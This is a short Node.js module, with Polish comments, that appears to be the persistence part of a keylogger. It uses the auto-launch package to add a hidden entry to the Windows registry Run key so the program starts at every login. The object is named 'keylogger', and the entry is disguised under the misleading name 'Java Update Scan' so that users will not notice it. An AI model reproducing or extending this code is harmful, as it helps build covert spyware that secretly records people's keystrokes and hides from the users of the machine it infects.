const autoLaunch = require('auto-launch');

//Tworzenie nowej aplikacji dodawanej do regedit, a dokładniej:
//Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
const keylogger = new autoLaunch({
    name: "Java Update Scan",
    isHidden: true
});

const addToAutoStart = () => {
    //sprawdzanie czy jest już dodana
    keylogger.isEnabled()
        .then(isEnabled =>{
            if(isEnabled){
                console.log('aplikacja znajdowała się już w autostarcie');
                return;
            }
            keylogger.enable(); //jeśli nie to dodaj
            console.log('dodano aplikacje do autostartu');
        })
        .catch(err => console.log(err));

};
module.exports.addToAutoStart = addToAutoStart;